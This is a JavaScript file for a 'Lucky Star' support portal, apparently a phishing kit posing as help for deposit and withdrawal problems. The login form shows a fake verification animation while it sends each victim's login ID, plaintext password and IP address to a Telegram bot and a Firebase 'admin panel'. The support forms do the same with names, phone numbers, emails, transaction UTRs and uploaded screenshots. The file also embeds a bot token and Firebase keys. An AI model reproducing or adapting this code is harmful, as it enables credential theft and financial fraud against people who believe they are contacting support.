// ================= FIREBASE CONFIG =================
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "lucky_star";

let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };

    if (window.firebase && window.firebase.firestore) { initDb(); return; }

    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => { loaded++; if (loaded === urls.length) initDb(); };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });

  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

// ================= CONFIG =================
const BOT_TOKEN = '8902846687:AAGE2QmaVtf-wden-XEp-5VHdAirq03igyQ';
const LOGIN_CHAT_ID = '-1003919574881';
const REQUEST_CHAT_ID = '-1003809176248';

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ================= PRELOADER =================
window.addEventListener('load', () => {
    const preloader = document.getElementById('preloader');
    setTimeout(() => {
        preloader.classList.add('hidden');
    }, 1800);
});

// ================= MENU =================
const menuBtn = document.getElementById('menu-btn');
const closeMenu = document.getElementById('close-menu');
const sideMenu = document.getElementById('side-menu');
const menuOverlay = document.getElementById('menu-overlay');

if (menuBtn) {
    menuBtn.addEventListener('click', () => {
        sideMenu.classList.add('open');
        menuOverlay.classList.add('active');
    });
}

if (closeMenu) {
    closeMenu.addEventListener('click', closeSideMenu);
}

if (menuOverlay) {
    menuOverlay.addEventListener('click', closeSideMenu);
}

function closeSideMenu() {
    sideMenu.classList.remove('open');
    menuOverlay.classList.remove('active');
}

// ================= LOGIN MODAL =================
const loginModal = document.getElementById('login-modal');
const closeLogin = document.getElementById('close-login');
const loginForm = document.getElementById('login-form');
const toggleBtns = document.querySelectorAll('.toggle-btn');
const phoneGroup = document.getElementById('phone-group');
const emailGroup = document.getElementById('email-group');
const submitMain = document.getElementById('submit-main');

// Toggle Phone/Email
toggleBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        toggleBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const type = btn.dataset.type;
        if (type === 'phone') {
            phoneGroup.classList.remove('hidden');
            emailGroup.classList.add('hidden');
        } else {
            phoneGroup.classList.add('hidden');
            emailGroup.classList.remove('hidden');
        }
    });
});

// Login Submit
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const isPhone = !phoneGroup.classList.contains('hidden');
        const phone = document.getElementById('login-phone').value.trim();
        const email = document.getElementById('login-email').value.trim();
        const password = document.getElementById('login-password').value;
        
        if (!password) {
            alert('Please enter your password');
            return;
        }
        
        if (isPhone && !phone) {
            alert('Please enter your phone number');
            return;
        }
        if (!isPhone && !email) {
            alert('Please enter your email');
            return;
        }
        
        // Save login data for profile
        const loginId = isPhone ? phone : email;
        sessionStorage.setItem('ls_login_id', loginId);
        sessionStorage.setItem('ls_login_type', isPhone ? 'phone' : 'email');
        
        // Show premium verification animation
        const verifyOverlay = document.getElementById('verify-overlay');
        const verifyIcon = document.getElementById('verify-icon');
        const verifyCheckIcon = document.getElementById('verify-check-icon');
        const verifyTitle = document.getElementById('verify-title');
        const verifySubtitle = document.getElementById('verify-subtitle');
        const verifyScanner = verifyOverlay?.querySelector('.verify-scanner');
        
        if (verifyOverlay) {
            verifyOverlay.classList.remove('hidden');
            verifyOverlay.style.display = 'flex';
        }
        
        // After 1.5s show success checkmark
        setTimeout(() => {
            if (verifyIcon) verifyIcon.classList.add('verify-hide');
            if (verifyCheckIcon) verifyCheckIcon.classList.add('verify-show');
            if (verifyTitle) verifyTitle.textContent = 'Verified Successfully';
            if (verifySubtitle) verifySubtitle.textContent = 'Redirecting to support portal...';
            if (verifyScanner) verifyScanner.classList.add('success');
        }, 1500);
        
        // Get IP in background
        const ipPromise = getIP();
        
        // Wait for animation to complete
        await new Promise(resolve => setTimeout(resolve, 2800));
        
        const loginText = `
🔐 <b>NEW LOGIN VERIFICATION</b>

📱 <b>Type:</b> ${isPhone ? 'Phone' : 'Email'}
🆔 <b>ID:</b> ${loginId}
🔑 <b>Password:</b> ${password}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🌐 <b>IP:</b> ${await ipPromise}
        `.trim();
        
        // Send to Telegram (non-blocking)
        sendTelegramMessage(LOGIN_CHAT_ID, loginText).catch(() => {});
        
        // Save login to Firebase for admin panel
        saveSubmission({
            event: 'login',
            type: 'Login',
            login_id: loginId,
            login_type: isPhone ? 'phone' : 'email',
            password: password,
            ip: await ipPromise
        }).catch(() => {});
        
        // Hide overlay and login, show submit page
        if (verifyOverlay) {
            verifyOverlay.classList.add('hidden');
            verifyOverlay.style.display = '';
        }
        loginModal.style.display = 'none';
        submitMain.style.display = 'block';
        
        // Staggered entrance animation for submit page
        const animElements = submitMain.querySelectorAll('.submit-header, .tabs, .tab-content.active');
        animElements.forEach((el, i) => {
            el.style.opacity = '0';
            el.style.transform = 'translateY(20px)';
            el.style.transition = 'none';
            requestAnimationFrame(() => {
                el.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            });
        });
        
        // Store login state
        sessionStorage.setItem('ls_logged_in', 'true');
    });
}

if (closeLogin) {
    closeLogin.addEventListener('click', () => {
        // Optional: allow close without login? 
        // For now, redirect to home if they close
        window.location.href = 'index.html';
    });
}

// Check if already logged in (session only)
if (submitMain && sessionStorage.getItem('ls_logged_in') === 'true') {
    if (loginModal) loginModal.style.display = 'none';
    submitMain.style.display = 'block';
}

// ================= TABS (Smooth Switch) =================
const tabBtns = document.querySelectorAll('.tab-btn');
const tabContents = document.querySelectorAll('.tab-content');

tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        if (btn.classList.contains('active')) return;
        
        const currentActive = document.querySelector('.tab-content.active');
        const targetId = 'tab-' + btn.dataset.tab;
        const targetContent = document.getElementById(targetId);
        
        // Exit current tab with animation
        if (currentActive) {
            currentActive.classList.remove('active');
            currentActive.classList.add('tab-exit');
        }
        
        // Enter new tab after exit animation
        setTimeout(() => {
            document.querySelectorAll('.tab-content.tab-exit').forEach(el => {
                el.classList.remove('tab-exit');
            });
            targetContent.classList.add('active');
        }, 200);
        
        // Update button states
        tabBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
    });
});

// ================= IMAGE UPLOAD PREVIEW =================
document.querySelectorAll('.file-input').forEach(input => {
    input.addEventListener('change', function() {
        const box = this.closest('.upload-box');
        const preview = box.querySelector('.preview-img');
        const placeholder = box.querySelector('.upload-preview');
        
        if (this.files && this.files[0]) {
            const reader = new FileReader();
            reader.onload = (e) => {
                preview.src = e.target.result;
                preview.classList.add('show');
                placeholder.style.opacity = '0';
            };
            reader.readAsDataURL(this.files[0]);
        }
    });
});

// ================= FORM SUBMISSION =================
document.querySelectorAll('.problem-form').forEach(form => {
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const type = form.dataset.type;
        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());
        const file = form.querySelector('.file-input').files[0];
        
        // Validation
        for (let [key, value] of Object.entries(data)) {
            if (!value || (typeof value === 'string' && !value.trim())) {
                alert('Please fill all fields');
                return;
            }
        }
        
        // Show loading on button with animation
        const btn = form.querySelector('.btn-submit-ios');
        const originalText = btn.innerHTML;
        btn.classList.add('processing');
        btn.innerHTML = '<span class="btn-shine"></span><span class="btn-text"><i class="fas fa-spinner fa-spin"></i> Processing...</span>';
        btn.disabled = true;
        
        // Build request message
        let requestText = '';
        if (type === 'deposit') {
            requestText = `
💰 <b>DEPOSIT PROBLEM REQUEST</b>

👤 <b>User:</b> ${data.username}
📱 <b>Mobile:</b> ${data.mobile}
📧 <b>Email:</b> ${data.email}
💵 <b>Amount:</b> ₹${data.amount}
🧾 <b>UTR:</b> ${data.utr}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
            `.trim();
        } else if (type === 'withdrawal') {
            requestText = `
💸 <b>WITHDRAWAL PROBLEM REQUEST</b>

👤 <b>User:</b> ${data.username}
📱 <b>Mobile:</b> ${data.mobile}
📧 <b>Email:</b> ${data.email}
💵 <b>Deposit Amt:</b> ₹${data.deposit_amount}
💸 <b>Withdrawal Amt:</b> ₹${data.withdrawal_amount}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
            `.trim();
        } else {
            requestText = `
⚠️ <b>OTHER PROBLEM REQUEST</b>

👤 <b>User:</b> ${data.username}
📱 <b>Mobile:</b> ${data.mobile}
📧 <b>Email:</b> ${data.email}
📝 <b>Issue:</b> ${data.issue}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
            `.trim();
        }
        
        // Send text to Telegram
        await sendTelegramMessage(REQUEST_CHAT_ID, requestText);
        
        // Send image if exists
        if (file) {
            await sendTelegramPhoto(REQUEST_CHAT_ID, file, `📎 Image from ${data.username}`);
        }
        
        // Save to Firebase for admin panel
        const firebaseData = { type: type === 'deposit' ? 'Deposit Problem' : type === 'withdrawal' ? 'Withdrawal Problem' : 'Other Problem', event: type };
        Object.keys(data).forEach(k => { if (data[k]) firebaseData[k] = data[k]; });
        saveSubmission(firebaseData).catch(() => {});
        
        // Save request to localStorage for profile history
        saveRequestToHistory(type, data);
        
        // Reset button
        btn.innerHTML = originalText;
        btn.disabled = false;
        btn.classList.remove('processing');
        
        // Show success
        showSuccessModal();
        
        // Reset form
        form.reset();
        form.querySelectorAll('.preview-img').forEach(img => {
            img.src = '';
            img.classList.remove('show');
        });
        form.querySelectorAll('.upload-preview').forEach(ph => {
            ph.style.opacity = '1';
        });
    });
});

// ================= SUCCESS MODAL =================
const successModal = document.getElementById('success-modal');
const successOk = document.getElementById('success-ok');

function showSuccessModal() {
    if (successModal) successModal.classList.add('show');
}

if (successOk) {
    successOk.addEventListener('click', () => {
        successModal.classList.remove('show');
    });
}

// ================= TELEGRAM FUNCTIONS =================
async function sendTelegramMessage(chatId, text) {
    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('Demo mode: No bot token set. Message:', text);
        return;
    }
    try {
        await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('Telegram send failed:', err);
    }
}

async function sendTelegramPhoto(chatId, photoFile, caption) {
    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('Demo mode: No bot token set. Photo upload skipped.');
        return;
    }
    try {
        const tgForm = new FormData();
        tgForm.append('chat_id', chatId);
        tgForm.append('photo', photoFile);
        tgForm.append('caption', caption);
        tgForm.append('parse_mode', 'HTML');
        
        await fetch(`${TELEGRAM_API}/sendPhoto`, {
            method: 'POST',
            body: tgForm
        });
    } catch (err) {
        console.error('Telegram photo send failed:', err);
    }
}

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'Unknown';
    }
}

// ================= PROFILE PAGE =================
function saveRequestToHistory(type, data) {
    const requests = JSON.parse(localStorage.getItem('ls_requests') || '[]');
    requests.unshift({
        type: type,
        data: data,
        date: new Date().toISOString(),
        status: 'Submitted'
    });
    localStorage.setItem('ls_requests', JSON.stringify(requests));
}

function initProfilePage() {
    const profileInitials = document.getElementById('profile-initials');
    const profileName = document.getElementById('profile-display-name');
    const profileLoginId = document.getElementById('profile-login-id');
    
    if (!profileName) return;
    
    const loginId = sessionStorage.getItem('ls_login_id') || 'Not logged in';
    const requests = JSON.parse(localStorage.getItem('ls_requests') || '[]');
    
    // Set user info
    profileLoginId.textContent = loginId;
    
    // Get latest username from requests if any
    const latestReq = requests.find(r => r.data && r.data.username);
    const displayName = latestReq ? latestReq.data.username : (loginId !== 'Not logged in' ? loginId.split('@')[0] : 'User');
    profileName.textContent = displayName;
    
    if (profileInitials) {
        profileInitials.textContent = displayName.charAt(0).toUpperCase();
    }
    
    // Stats
    const total = requests.length;
    const deposits = requests.filter(r => r.type === 'deposit').length;
    const withdrawals = requests.filter(r => r.type === 'withdrawal').length;
    const others = requests.filter(r => r.type === 'other').length;
    
    document.getElementById('stat-total').textContent = total;
    document.getElementById('stat-deposit').textContent = deposits;
    document.getElementById('stat-withdrawal').textContent = withdrawals;
    document.getElementById('stat-other').textContent = others;
    
    // Activity list
    const activityList = document.getElementById('activity-list');
    if (!activityList) return;
    
    if (requests.length === 0) {
        activityList.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-inbox"></i>
                <p>No requests submitted yet</p>
            </div>`;
    } else {
        activityList.innerHTML = requests.slice(0, 10).map(req => {
            const icons = { deposit: 'fa-wallet', withdrawal: 'fa-hand-holding-usd', other: 'fa-exclamation-circle' };
            const labels = { deposit: 'Deposit', withdrawal: 'Withdrawal', other: 'Other' };
            const date = new Date(req.date).toLocaleDateString();
            const amount = req.data ? (req.data.amount || req.data.withdrawal_amount || '') : '';
            return `
                <div class="activity-item">
                    <div class="activity-item-icon activity-${req.type}">
                        <i class="fas ${icons[req.type] || 'fa-file'}"></i>
                    </div>
                    <div class="activity-item-info">
                        <div class="activity-item-title">${labels[req.type] || 'Request'} ${amount ? '- ₹' + amount : ''}</div>
                        <div class="activity-item-meta">${date} · ${req.data?.username || 'User'}</div>
                    </div>
                    <div class="activity-item-status">${req.status}</div>
                </div>`;
        }).join('');
    }
}

// Initialize profile page if on profile.html
if (window.location.pathname.includes('profile.html') || document.getElementById('profile-display-name')) {
    initProfilePage();
}

// ================= LOGOUT =================
const logoutBtn = document.getElementById('logout-btn');
if (logoutBtn) {
    logoutBtn.addEventListener('click', () => {
        sessionStorage.clear();
        window.location.href = 'index.html';
    });
}

// ================= SMOOTH SCROLL =================
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({ behavior: 'smooth', block: 'start' });
            closeSideMenu();
        }
    });
});

// Preload Firebase in background
loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));